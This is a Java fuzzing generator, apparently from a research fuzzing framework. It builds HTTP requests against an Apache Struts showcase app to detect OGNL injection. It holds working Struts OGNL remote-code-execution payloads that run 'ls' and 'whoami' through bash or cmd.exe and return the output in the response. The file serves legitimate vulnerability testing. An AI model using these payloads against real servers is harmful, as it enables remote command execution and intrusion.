package edu.berkeley.cs.jqf.examples.http;

import com.pholser.junit.quickcheck.generator.GenerationStatus;
import com.pholser.junit.quickcheck.generator.Generator;
import com.pholser.junit.quickcheck.random.SourceOfRandomness;
import edu.berkeley.cs.jqf.examples.common.DictionaryBackedStringGenerator;
import edu.berkeley.cs.jqf.fuzz.guidance.StringEqualsHintingInputStream;
import edu.columbia.cs.psl.phosphor.runtime.Taint;
import edu.columbia.cs.psl.phosphor.struct.LazyCharArrayObjTags;
import edu.columbia.cs.psl.phosphor.struct.TaintedObjectWithObjTag;
import edu.gmu.swe.knarr.runtime.Symbolicator;
import org.apache.http.Header;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;

import java.io.*;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;


public class StrutsRequestGenerator extends HTTPRequestGenerator {

    private final String bodyOGNLInjectionString = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D";

    private Generator<String> validUrlGenerator;
    private Generator<String> OGNLInjectionStrings;

    private Boolean OGNLInjectionDone;

    public StrutsRequestGenerator() {
        super();
        try {
            this.OGNLInjectionDone = false;
            this.validUrlGenerator =  new DictionaryBackedStringGenerator("dictionaries/struts-showcase-validUrls.dict", stringGenerator);
            this.OGNLInjectionStrings = new DictionaryBackedStringGenerator("dictionaries/struts-showcase-n-day-strings.dict", stringGenerator);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }



    private static String applyTaints(String result, Object taint) {
        if (!(taint instanceof TaintedObjectWithObjTag))
            return result;

        String ret = new String(result);

        if (Symbolicator.getTaints(result) instanceof LazyCharArrayObjTags) {
            LazyCharArrayObjTags taints = (LazyCharArrayObjTags) Symbolicator.getTaints(result);
            if (taints.taints != null)
                for (int i = 0 ; i < taints.taints.length ; i++)
                    taints.taints[i] = (taints.taints[i] == null ? ((Taint)((TaintedObjectWithObjTag)taint).getPHOSPHOR_TAG()) : taints.taints[i]);
            else
                taints.setTaints(((Taint)((TaintedObjectWithObjTag)taint).getPHOSPHOR_TAG()));
        }

        return ret;

    }

    private Boolean decideIfInjectOGNL(SourceOfRandomness random) {
        Boolean result =  random.nextBoolean() &&  !this.OGNLInjectionDone;
        if(result) {
            this.OGNLInjectionDone = true;
        }
        return result;

    }

    private void getStrutsHeaders(RequestBuilder builder, SourceOfRandomness random, GenerationStatus status, String body) {


        Boolean injectOGNLInHeaders = random.nextBoolean();

        Set<String> staticHeaders = new HashSet<>();
        staticHeaders.add("Host");
        staticHeaders.add("Content-Type");
        staticHeaders.add("Content-Length");


        // Must have these headers to mke valid request
        builder.addHeader("Host", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) :"any");
        builder.addHeader("Content-Type", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) : "application/x-www-form-urlencoded");

        builder.addHeader("Content-Length", String.valueOf(body.length()));



        // Add more headers - make sure not to step over the ones we need
        int index = random.nextInt(max_elements);
        int i = 0;

        boolean coin = random.nextBoolean();
        int choice = random.nextInt(0, Integer.MAX_VALUE);



        while(i< index) {
            String newHeader = "";
            String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();

            if (hints != null && hints.length > 0 && coin) {
                choice = choice % hints.length;
                newHeader = new String(hints[choice]);
                newHeader = applyTaints(newHeader, choice);
            } else {
                newHeader = makeString(random, status);
                newHeader = applyTaints(newHeader, i);
            }


            coin = random.nextBoolean();
            choice = random.nextInt(0, Integer.MAX_VALUE);
            if(!staticHeaders.contains(newHeader)) {

                String val = "";


                if (hints != null && hints.length > 0 && coin) {
                    choice = choice % hints.length;
                    val = hints[choice];
                    val = applyTaints(val, choice);
                } else {
                    val = makeMultiLineString(random, status);
                    val = applyTaints(val, choice);
                }

                newHeader = applyTaints(newHeader, i);
                builder.addHeader(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :val);
                i++;
            }
        }
    }

    private String createHeaderString(String headerType, String headerVal) {
        return headerType + ": " + headerVal + "\r\n";
    }
    private ArrayList<String> getStrutsHeaderStrings(SourceOfRandomness random, GenerationStatus status, String body) {
        Boolean injectOGNLInHeaders = random.nextBoolean();

        ArrayList<String> ret = new ArrayList<>();

        Set<String> staticHeaders = new HashSet<>();
        staticHeaders.add("Host");
        staticHeaders.add("Content-Type");
        staticHeaders.add("Content-Length");


        // Must have these headers to mke valid request
        ret.add(createHeaderString("Host", (injectOGNLInHeaders && false) ? this.OGNLInjectionStrings.generate(random, status) :"any"));



        ArrayList<String> contentTypeVals = getDictionaryValues("dictionaries/http-content-types.dict");


        String contentType = chooseAndTaint(contentTypeVals, random);

        ret.add(createHeaderString("Content-Type", contentType));

        ret.add(createHeaderString("Content-Length", String.valueOf(body.length())));



//        // Add more headers - make sure not to step over the ones we need
//        int index = random.nextInt(1);
//        int i = 0;
//
//        boolean coin = random.nextBoolean();
//        int choice = random.nextInt(0, Integer.MAX_VALUE);
//
//
//        while(i< index) {
//            String newHeader = "";
//            String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();
//
//            if (hints != null && hints.length > 0 && coin) {
//                choice = choice % hints.length;
//                newHeader = new String(hints[choice]);
//                newHeader = applyTaints(newHeader, choice);
//            } else {
//                newHeader = makeString(random, status);
//                newHeader = applyTaints(newHeader, i);
//            }
//
//
//            coin = random.nextBoolean();
//            choice = random.nextInt(0, Integer.MAX_VALUE);
//            if(!staticHeaders.contains(newHeader)) {
//
//                String val = "";
//
//
//                if (hints != null && hints.length > 0 && coin) {
//                    choice = choice % hints.length;
//                    val = hints[choice];
//                    val = applyTaints(val, choice);
//                } else {
//                    val = makeMultiLineString(random, status);
//                    val = applyTaints(val, choice);
//                }
//
//                ret.add(createHeaderString(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :val));
//                i++;
//            }
//        }

        return ret;
    }

    @Override
    public String generate(SourceOfRandomness random, GenerationStatus status) {
        RequestBuilder builder = this.getReqType(random, status);
        String url = builder.getUri().toString();
        String body = this.getBody(random, status, url);
        getStrutsHeaders(builder,random,status,body);

        // getParameters(builder,random,status);
        HttpUriRequest req =  builder.build();


       // String request = req.toString() + "\r\n";

        String request = getReqTypeString(random) + "\r\n";

        Header[] headerFields = req.getAllHeaders();

        ArrayList<String> headerStrings = getStrutsHeaderStrings(random, status, body);
        for (int i = 0; i < headerStrings.size(); i++) {


            request += headerStrings.get(i);
        }
        request += "\r\n";
        request += body;
        request += "\r\n\r\n";

        this.OGNLInjectionDone = false;

        String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();

        String word ="";

        int choice = random.nextInt(65535);

        boolean coin = random.nextBoolean();
        if(coin) {
            if (hints != null && hints.length > 0) {
                choice = choice % hints.length;
                word = hints[choice];
            }
        }
        else {
                choice = random.nextInt(3);
                switch (choice) {

                    case 0:
                        word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
                        break;
                    case 1:
                        word = "text/html";
                        break;
                    case 2:
                        word = "testing";
                        break;
                }
        }

        request = getReqTypeString(random) + "\r\n" +
                "Host: any\r\n" +
                "Content-Type:" + applyTaints(word, choice) + "\r\n" +
                "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
        return request;
    }

    protected String getBody(SourceOfRandomness random, GenerationStatus status, String url) {
        String body = "";
       try {
           String OGNL_INJECTION_STRING = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D";
           String dictPath = url.replace('!', '_') + "body_vals.dict";
           ArrayList<String> bodyVals = getDictionaryValues("dictionaries" + dictPath);


           if(bodyVals != null) {

               for (int i = 0; i < bodyVals.size(); i++) {

                   body += (bodyVals.get(i) + "=");

                   //OGNL Injection?
                   if (random.nextBoolean()) {
                       body += OGNL_INJECTION_STRING;
                   } else {
                       body += randomStringGenerator.generate(random, status);
                   }

                   if (i != bodyVals.size() - 1) {
                       body += "&";
                   }
               }
           }
       }catch(NullPointerException e) {
           e.printStackTrace();
       }


        return body;
    }


    @Override
    protected RequestBuilder getReqType(SourceOfRandomness random, GenerationStatus status) {
        int index = random.nextInt(5);
        switch(index) {
            case 0:
                return RequestBuilder.get(this.validUrlGenerator.generate(random, status));
            case 1:
                return RequestBuilder.post(this.validUrlGenerator.generate(random, status));
            case 2:
                return RequestBuilder.head(this.validUrlGenerator.generate(random, status));
            case 3:
                return RequestBuilder.delete(this.validUrlGenerator.generate(random, status));
            case 4:
                return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
            // shouldn't get here
            default:
                return null;
        }
    }



    private String chooseAndTaint(ArrayList<String> in, SourceOfRandomness random) {

        int choice = random.nextInt(0, Integer.MAX_VALUE);
        int index = choice % in.size();
        String ret = in.get(index);
        ret = applyTaints(ret, index);
        return ret;

    }

    private ArrayList<String> getDictionaryValues(String dictPath) {
        ArrayList<String> vals = new ArrayList<>();
        try (InputStream in = ClassLoader.getSystemClassLoader().getResourceAsStream(dictPath)) {

            // no dictionary.... return an empty body.
            if (in == null) {
                System.out.println("COULDNT FIND THE DICTIONARY " +  dictPath);
                return null;
                //throw new FileNotFoundException("Dictionary file not found: " +  "dictionaries" + dictPath);
            }

            // System.out.println("FOUND THE DICTIONARY! " + "dictionaries" + dictPath);

            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String item;
            while ((item = br.readLine()) != null) {
                vals.add(item);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return vals;

    }

    private String getReqTypeString(SourceOfRandomness random) {

        ArrayList<String> urlVals = getDictionaryValues("dictionaries/struts-showcase-validUrls.dict");


        String url = chooseAndTaint(urlVals, random);

        int index = random.nextInt(2);
        String result = "";
        switch(index) {
            case 0:
                result = "GET" ;// RequestBuilder.get(this.validUrlGenerator.generate(random, status));
                break;
            case 1:
                result = "POST"; //RequestBuilder.post(this.validUrlGenerator.generate(random, status));
                break;
            case 2:
                result = "HEAD"; //return RequestBuilder.head(this.validUrlGenerator.generate(random, status));
                break;
            case 3:
                result = "DELETE"; //return RequestBuilder.delete(this.validUrlGenerator.generate(random, status));
                break;
            case 4:
                result = "TRACE"; //return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
                break;
        }

        result = applyTaints(result, index);
        result += (" " + url + " HTTP/1.1");
//        result = applyTaints(result, index);
        return result;
    }
}
